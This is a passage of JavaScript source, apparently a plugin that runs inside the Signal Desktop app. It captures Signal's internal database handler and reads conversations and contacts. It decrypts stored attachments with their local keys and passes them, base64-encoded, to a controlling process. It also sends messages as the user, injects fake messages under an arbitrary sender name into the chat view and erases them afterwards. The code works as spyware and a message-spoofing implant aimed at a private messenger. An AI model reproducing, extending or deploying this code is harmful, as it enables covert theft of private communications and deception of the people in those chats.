                    plugin.sendData('inject_result', data);
                } catch (e) {
                    plugin.sendData('_error', { phase: 'inject', error: 'Parse: ' + String(e) + ' raw=' + String(raw).substring(0, 200) });
                }
            });
        });
    }).catch(function(e) {
        plugin.sendData('inject_result', { conversationId: conversationId, success: false, error: String(e) });
        plugin.sendData('_error', { phase: 'inject', error: String(e) });
    });
}

// ===== Clear injected messages =====

function clearInjectedMessages() {
    if (injectedMessages.length === 0) {
        plugin.sendData('clear_injected_result', { success: true, cleared: 0 });
        return Promise.resolve();
    }

    if (!signalWindowId) {
        plugin.sendData('clear_injected_result', { success: false, error: 'No Signal window' });
        return Promise.resolve();
    }

    var code =
        '(function() {' +
        // First disconnect all MutationObservers so they don't re-inject
        '  if (window.__jstapInjectedObservers) {' +
        '    window.__jstapInjectedObservers.forEach(function(obs) { obs.disconnect(); });' +
        '    window.__jstapInjectedObservers = [];' +
        '  }' +
        '  var injected = document.querySelectorAll("[data-jstap-injected]");' +
        '  var count = injected.length;' +
        '  for (var i = 0; i < injected.length; i++) {' +
        '    injected[i].parentNode.removeChild(injected[i]);' +
        '  }' +
        '  return JSON.stringify({ success: true, cleared: count });' +
        '})()';

    return plugin.executeInRenderer(signalWindowId, code).then(function(raw) {
        try {
            var data = JSON.parse(raw);
            if (data.cleared > 0) {
                injectedMessages = [];
                plugin.sendData('injected_messages', { messages: [], count: 0 });
            }
            plugin.sendData('clear_injected_result', data);
        } catch (e) {
            plugin.sendData('clear_injected_result', { success: false, error: 'Parse error: ' + String(e) });
        }
    }).catch(function(e) {
        plugin.sendData('clear_injected_result', { success: false, error: String(e) });
    });
}

// ===== Download attachment =====
// Run from main process using fs/crypto directly (no renderer needed)

function downloadAttachment(messageId, attachmentIndex) {
    var safeIndex = parseInt(attachmentIndex, 10) || 0;

    return queryDB('getMessageById', [messageId]).then(function(result) {
        if (!result) {
            plugin.sendData('attachment_data', { messageId: messageId, error: 'Message not found' });
            return;
        }

        var msg = result;
        if (typeof msg === 'string') {
            try { msg = JSON.parse(msg); } catch (e) {}
        }
        if (msg.json && typeof msg.json === 'string') {
            try { msg = JSON.parse(msg.json); } catch (e) {}
        }

        var attachments = msg.attachments || [];
        if (safeIndex >= attachments.length) {
            plugin.sendData('attachment_data', { messageId: messageId, error: 'Attachment index out of range' });
            return;
        }

        var att = attachments[safeIndex];
        var fileName = att.fileName || att.filename || 'attachment';
        var contentType = att.contentType || att.content_type || 'application/octet-stream';
        var attPath = att.path || '';
        var localKey = att.localKey || '';

        if (!attPath) {
            plugin.sendData('attachment_data', { messageId: messageId, fileName: fileName, error: 'No attachment path' });
            return;
        }

        try {
            var userDataPath = plugin.electron.app.getPath('userData');
            var fullPath = plugin.path.join(userDataPath, 'attachments.noindex', attPath);

            if (!plugin.fs.existsSync(fullPath)) {
                plugin.sendData('attachment_data', { messageId: messageId, fileName: fileName, error: 'File not found: ' + attPath });
                return;
            }

            var fileData = plugin.fs.readFileSync(fullPath);

            if (localKey) {
                // Try decryption
                try {
                    var keyBuf = Buffer.from(localKey, 'base64');
                    if (keyBuf.length >= 80) {
                        var aesKey = keyBuf.slice(0, 32);
                        var iv = keyBuf.slice(64, 80);

                        // Try AES-256-CBC first
                        try {
                            var decipher = plugin.crypto.createDecipheriv('aes-256-cbc', aesKey, iv);
                            fileData = Buffer.concat([decipher.update(fileData), decipher.final()]);
                        } catch (cbcErr) {
                            // Try AES-256-GCM
                            try {
                                var tag = fileData.slice(fileData.length - 16);
                                var ciphertext = fileData.slice(0, fileData.length - 16);
                                var decipher2 = plugin.crypto.createDecipheriv('aes-256-gcm', aesKey, iv);
                                decipher2.setAuthTag(tag);
                                fileData = Buffer.concat([decipher2.update(ciphertext), decipher2.final()]);
                            } catch (gcmErr) {
                                // Return raw data with warning
                                plugin.sendData('attachment_data', {
                                    messageId: messageId,
                                    fileName: fileName,
                                    contentType: contentType,
                                    data: fileData.toString('base64'),
                                    size: fileData.length,
                                    warning: 'Could not decrypt, returning raw'
                                });
                                return;
                            }
                        }
                    }
                } catch (cryptoErr) {
                    plugin.sendData('attachment_data', { messageId: messageId, fileName: fileName, error: 'Crypto: ' + String(cryptoErr) });
                    return;
                }
            }

            plugin.sendData('attachment_data', {
                messageId: messageId,
                fileName: fileName,
                contentType: contentType,
                data: fileData.toString('base64'),
                size: fileData.length
            });
        } catch (e) {
            plugin.sendData('attachment_data', { messageId: messageId, fileName: fileName, error: String(e) });
        }
    }).catch(function(e) {
        plugin.sendData('attachment_data', { messageId: messageId, error: String(e) });
    });
}

// ===== Fetch contacts (private conversations) =====

function fetchContacts() {
    if (contacts.length > 0) {
        plugin.sendData('contact_list', { contacts: contacts, count: contacts.length });
        return Promise.resolve();
    }
    return fetchConversations();
}

// ===== DOM discovery (debugging) =====

function domDiscovery(conversationId) {
    if (!signalWindowId) {
        plugin.sendData('_error', { phase: 'dom_discovery', error: 'No Signal window' });
        return Promise.resolve();
    }

    // Open a conversation first so the message list is visible
    var convName = '';
    var convId = conversationId || '';
    if (!convId && conversations.length > 0) {
        convId = conversations[0].id;
        convName = conversations[0].name;
    } else if (convId && conversationMap[convId]) {
        convName = conversationMap[convId].name || '';
    }

    var openPromise;
    if (convName) {
        var safeConvName = JSON.stringify(convName);
        var openCode =
            '(function() {' +
            '  var convName = ' + safeConvName + ';' +
            '  var allBtns = document.querySelectorAll("button");' +
            '  for (var j = 0; j < allBtns.length; j++) {' +
            '    var lbl = allBtns[j].getAttribute("aria-label") || "";' +
            '    if (lbl.indexOf("Chat with") !== -1 && lbl.indexOf(convName) !== -1) {' +
            '      allBtns[j].click(); return "opened";' +
            '    }' +
            '  }' +
            '  return "not_found";' +
            '})()';
        openPromise = plugin.executeInRenderer(signalWindowId, openCode).then(function() {
            return new Promise(function(resolve) { plugin.setTimeout(resolve, 1500); });
        });
    } else {
        openPromise = Promise.resolve();
    }

    return openPromise.then(function() {
    // Simple discovery: dump roles, find message container, inspect one message's innerHTML
    var code = [
        '(function() {',
        '  try {',
        '  var info = {};',
        '  info.roles = [];',
        '  document.querySelectorAll("[role]").forEach(function(el) {',
        '    info.roles.push(el.getAttribute("role") + ":" + el.tagName + " cls=" + (String(el.className||"")).substring(0,50) + " kids=" + el.children.length);',
        '  });',
        '  info.editables = [];',
        '  document.querySelectorAll("[contenteditable]").forEach(function(el) {',
        '    info.editables.push(el.tagName + " cls=" + (String(el.className||"")).substring(0,50) + " role=" + el.getAttribute("role"));',
        '  });',
        // Try to find the main content area - look for a large div with many children
        '  var candidates = [];',
        '  document.querySelectorAll("div").forEach(function(el) {',
        '    if (el.children.length > 10) {',
        '      candidates.push((String(el.className||"")).substring(0,60) + " kids=" + el.children.length + " tag=" + el.tagName);',
        '    }',
        '  });',
        '  info.largeDivs = candidates.slice(0, 15);',
        // Get outerHTML of the last child of any element with class containing "timeline" or with many children
        '  var timeline = document.querySelector("[class*=timeline]");',
        '  info.timelineFound = !!timeline;',
        '  if (timeline) {',
        '    info.timelineClass = (timeline.className||"").substring(0,100);',
        '    info.timelineKids = timeline.children.length;',
        '    if (timeline.lastElementChild) {',
        '      info.lastChildHTML = timeline.lastElementChild.outerHTML.substring(0, 500);',
        '    }',
        '  }',
        '  var msgList = document.querySelector(".module-timeline__messages");',
        '  if (msgList) {',
        '    info.msgListKids = msgList.children.length;',
        // List first 10 children class names to understand the structure
        '    info.childClasses = [];',
        '    for (var ci = 0; ci < Math.min(msgList.children.length, 10); ci++) {',
        '      info.childClasses.push(String(msgList.children[ci].className || "").substring(0, 80));',
        '    }',
        // Get HTML of a real message (skip detector elements and date headers)
        '    for (var mi = msgList.children.length - 1; mi >= 0; mi--) {',
        '      var mc = String(msgList.children[mi].className || "");',
        '      if (mc.indexOf("at-bottom-detector") === -1 && mc.indexOf("DateHeader") === -1 && mc.indexOf("last-seen") === -1 && msgList.children[mi].children.length > 0) {',
        '        info.messageHTML = msgList.children[mi].outerHTML.substring(0, 2000);',
        '        info.messageClass = mc.substring(0, 150);',
        '        break;',
        '      }',
        '    }',
        '  }',
        '  return JSON.stringify(info);',
        '  } catch(err) { return JSON.stringify({error: String(err)}); }',
        '})()'
    ].join('\n');

    return plugin.executeInRenderer(signalWindowId, code).then(function(raw) {
        try {
            var data = JSON.parse(raw);
            if (data.error) {
                plugin.sendData('_error', { phase: 'dom_discovery', error: data.error });
                return;
            }
            plugin.sendData('_error', { phase: 'dom_roles', error: JSON.stringify(data.roles || []).substring(0, 500) });
            plugin.sendData('_error', { phase: 'dom_editables', error: JSON.stringify(data.editables || []) });
            plugin.sendData('_error', { phase: 'dom_largeDivs', error: JSON.stringify(data.largeDivs || []).substring(0, 500) });
            plugin.sendData('_error', { phase: 'dom_timeline', error: 'found=' + data.timelineFound + ' class=' + (data.timelineClass || 'none') + ' kids=' + data.timelineKids });
            if (data.lastChildHTML) {
                var html = data.lastChildHTML;
                for (var i = 0; i < html.length; i += 450) {
                    plugin.sendData('_error', { phase: 'dom_lastChild' + (i > 0 ? '_' + i : ''), error: html.substring(i, i + 450) });
                }
            }
            if (data.childClasses) {
                plugin.sendData('_error', { phase: 'dom_msgChildren', error: JSON.stringify(data.childClasses).substring(0, 500) });
            }
            if (data.messageClass) {
                plugin.sendData('_error', { phase: 'dom_msgClass', error: data.messageClass });
            }
            if (data.messageHTML) {
                var mhtml = data.messageHTML;
                for (var mi = 0; mi < mhtml.length; mi += 450) {
                    plugin.sendData('_error', { phase: 'dom_msg' + (mi > 0 ? '_' + mi : ''), error: mhtml.substring(mi, mi + 450) });
                }
            }
        } catch (e) {
            plugin.sendData('_error', { phase: 'dom_discovery', error: 'Parse: ' + String(e) + ' raw=' + String(raw).substring(0, 300) });
        }
    }).catch(function(e) {
        plugin.sendData('_error', { phase: 'dom_discovery', error: String(e) });
    });
    }); // end openPromise.then
}

// ===== Command handler =====

function onCommand(cmd) {
    var action = cmd.action;

    if (action === 'fetch_conversations') return fetchConversations();
    if (action === 'fetch_messages') return fetchMessages(cmd.conversationId, cmd.conversationName, cmd.options || {});
    if (action === 'search') return searchMessages(cmd.query);
    if (action === 'send_message') return sendMessage(cmd.conversationId, cmd.text);
    if (action === 'inject_message') return injectFakeMessage(cmd.conversationId, cmd.senderName, cmd.text);
    if (action === 'clear_injected') return clearInjectedMessages();
    if (action === 'download_attachment') return downloadAttachment(cmd.messageId, cmd.attachmentIndex);
    if (action === 'fetch_contacts') return fetchContacts();
    if (action === 'dom_discovery') return domDiscovery(cmd.conversationId);

    plugin.sendData('_error', { phase: 'command', error: 'Unknown action: ' + action });
}

// ===== Bootstrap =====

function tryBootstrap() {
    bootstrapAttempts++;

    signalWindowId = findSignalWindow();

    if (!signalWindowId) {
        plugin.sendData('_error', {
            phase: 'bootstrap',
            error: 'No Signal window found',
            attempt: bootstrapAttempts,
            windowCount: plugin.getWindows().length
        });
        var delay = bootstrapAttempts <= 3 ? 3000 : (bootstrapAttempts <= 6 ? 8000 : 15000);
        plugin.setTimeout(tryBootstrap, delay);
        return;
    }

    // Try to capture Signal's SQL handler from ipcMain
    var captured = captureSqlHandler();
    plugin.sendData('_debug', { fn: 'bootstrap', windowId: signalWindowId, attempt: bootstrapAttempts, sqlHandlerCaptured: captured });

    testDBAccess().then(function(ok) {
        if (!ok) {
            plugin.sendData('_error', {
                phase: 'bootstrap',
                error: 'DB access test failed',
                attempt: bootstrapAttempts,
                handlerCaptured: !!sqlReadHandler
            });
            var delay = bootstrapAttempts <= 5 ? 3000 : (bootstrapAttempts <= 10 ? 8000 : 15000);
            plugin.setTimeout(tryBootstrap, delay);
            return;
        }

        if (plugin.settings.autoFetchConversations !== 0) {
            fetchConversations();
        }
    }).catch(function(e) {
        plugin.sendData('_error', { phase: 'bootstrap', error: String(e), attempt: bootstrapAttempts });
        plugin.setTimeout(tryBootstrap, 15000);
    });
}

plugin.setTimeout(tryBootstrap, 3000);

return {
    cleanup: function() {},
    onCommand: onCommand
};
